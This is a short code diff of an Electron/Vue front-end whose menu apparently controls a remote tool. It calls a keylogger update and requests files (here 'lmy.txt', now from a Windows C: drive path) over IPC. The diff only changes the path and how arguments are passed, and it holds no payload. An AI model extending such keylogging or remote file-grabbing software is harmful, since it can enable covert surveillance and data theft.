@@ -118,7 +118,7 @@ export default {
 
       }
       if (this.menus[index] === '文件目录') {
-        this.getFile('/', 'lmy.txt')
+        this.getFile('C:\\', 'lmy.txt')
       }
       if (this.menus[index] === '断开连接') {
         this.updateKeylogger()
@@ -221,11 +221,11 @@ export default {
      * @description: 获取文件
      * @return {string} url 文件保存路径
      */
-    getFile (path, fileName) {
+    getFile (p, f) {
       ipcRenderer.once('transfile', (event, url) => {
         alert('文件保存在' + url)
       })
-      ipcRenderer.send('requestFile', path, fileName)
+      ipcRenderer.send('requestFile', { path: p, fileName: f })
     },
     /**
      * @description: 求取文件预览目录
